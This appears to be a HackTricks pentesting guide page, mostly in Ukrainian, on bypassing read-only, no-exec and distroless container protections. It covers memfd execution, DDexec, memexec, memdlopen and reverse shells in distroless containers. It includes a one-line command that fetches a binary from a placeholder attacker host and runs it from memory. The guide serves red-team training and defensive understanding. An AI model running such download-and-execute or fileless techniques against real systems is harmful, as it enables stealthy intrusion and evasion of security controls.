# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../banners/hacktricks-training.md}}


## Videos

У наведених відео техніки, згадані на цій сторінці, пояснені детальніше:

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)

## read-only / no-exec scenario

Стає все більш поширеним знаходити linux машини, змонтовані з **read-only (ro) file system protection**, особливо в контейнерах. Це тому, що запустити контейнер з ro файловою системою так само просто, як встановити **`readOnlyRootFilesystem: true`** в `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Однак навіть якщо файлова система змонтована як ro, **`/dev/shm`** все ще буде доступна для запису, тож це не означає, що ми зовсім не можемо нічого записати на диск. Проте ця папка буде **mounted with no-exec protection**, тому якщо ви завантажите сюди бінарник, ви **не зможете його виконати**.

> [!WARNING]
> З погляду red team, це ускладнює **download and execute** бінарників, які ще не присутні в системі (наприклад backdoors або енумератори на кшталт `kubectl`).

## Easiest bypass: Scripts

Зауважте, я говорив про бінарники — ви можете **виконувати будь-який скрипт**, поки інтерпретатор присутній у машині, наприклад **shell script**, якщо є `sh`, або **python script**, якщо встановлено `python`.

Однак цього недостатньо, щоб просто виконати ваш бінарний backdoor або інші бінарні інструменти, які можуть знадобитися.

## Memory Bypasses

Якщо ви хочете виконати бінарник, але файлова система не дозволяє цього, найкращий спосіб — **виконати його з пам'яті**, оскільки ці захисти там не застосовуються.

### FD + exec syscall bypass

Якщо в машині є потужні рушії скриптів, такі як **Python**, **Perl**, або **Ruby**, ви можете завантажити бінарник для виконання з пам'яті, зберегти його в дескрипторі файлу в пам'яті (`create_memfd` syscall), який не підпадає під ці захисти, а потім викликати **`exec` syscall**, вказавши **fd як файл для виконання**.

Для цього ви легко можете використати проєкт [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Ви передаєте йому бінарник, і він згенерує скрипт на вказаній мові з **бінарником, стисненим і закодованим в b64**, з інструкціями для **декодування та розпаковування** в **fd**, створений викликом `create_memfd` syscall, і викликом **exec** syscall для його запуску.

> [!WARNING]
> Це не працює в інших мовах сценаріїв, таких як PHP або Node, тому що вони не мають жодного d**efault way to call raw syscalls** з скрипту, тож неможливо викликати `create_memfd` для створення **memory fd** для зберігання бінарника.
>
> Більше того, створення **звичайного fd** з файлом у `/dev/shm` не спрацює, оскільки вам не дозволять його виконати через те, що застосовується **no-exec protection**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) — це техніка, яка дозволяє **модифікувати пам'ять власного процесу**, перезаписуючи його **`/proc/self/mem`**.

Отже, **контролюючи assembly-код**, який виконує процес, ви можете написати **shellcode** і "мутувати" процес, щоб **виконати будь-який довільний код**.

> [!TIP]
> **DDexec / EverythingExec** дозволяє завантажити і **виконати** ваш власний **shellcode** або **будь-який бінарник** з **пам'яті**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
For more information about this technique check the Github or:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) — це природний наступний крок після DDexec. Це **DDexec shellcode, запущений як демон**, тому щоразу, коли ви хочете **запустити інший бінарний файл**, вам не потрібно перезапускати DDexec — можна просто виконати memexec shellcode через техніку DDexec і потім **спілкуватися з цим демоном, щоб передавати нові бінарні файли для завантаження та виконання**.

Ви можете знайти приклад того, як використовувати **memexec для виконання бінарних файлів з PHP reverse shell** тут: [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

З подібною до DDexec метою, [**memdlopen**](https://github.com/arget13/memdlopen) техніка дозволяє **простішим способом завантажувати бінарні файли** в пам'ять для подальшого виконання. Вона навіть може дозволити завантажувати бінарні файли з залежностями.

## Distroless Bypass

For a dedicated explanation of **what distroless actually is**, when it helps, when it does not, and how it changes post-exploitation tradecraft in containers, check:

{{#ref}}
../../privilege-escalation/container-security/distroless.md
{{#endref}}

### What is distroless

Distroless containers містять лише **мінімально необхідні компоненти для запуску конкретного додатку або сервісу**, такі як бібліотеки та runtime dependencies, але виключають більші компоненти — наприклад package manager, shell або системні утиліти.

Мета distroless контейнерів — **зменшити attack surface контейнерів шляхом видалення непотрібних компонентів** і мінімізувати кількість вразливостей, які можна експлуатувати.

### Reverse Shell

В distroless контейнері ви може́те **навіть не знайти `sh` або `bash`**, щоб отримати звичайний shell. Також не буде бінарників, таких як `ls`, `whoami`, `id`... все те, що ви зазвичай запускаєте в системі.

> [!WARNING]
> Therefore, you **won't** be able to get a **reverse shell** or **enumerate** the system as you usually do.

Однак, якщо скомпрометований контейнер, наприклад, запускає flask веб-додаток, то встановлено python, і тому ви можете отримати **Python reverse shell**. Якщо він запускає node, ви можете отримати Node rev shell, і так само для майже будь-якої **scripting language**.

> [!TIP]
> Using the scripting language you could **enumerate the system** using the language capabilities.

Якщо немає **`read-only/no-exec`** захистів, ви можете зловживати своїм reverse shell, щоб **записати в файлову систему ваші бінарні файли** і **виконати** їх.

> [!TIP]
> However, in this kind of containers these protections will usually exist, but you could use the **previous memory execution techniques to bypass them**.

Ви можете знайти **приклади** того, як **експлуатувати деякі RCE vulnerabilities**, щоб отримати scripting languages **reverse shells** і виконувати бінарні файли з пам'яті тут: [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).


{{#include ../../../banners/hacktricks-training.md}}
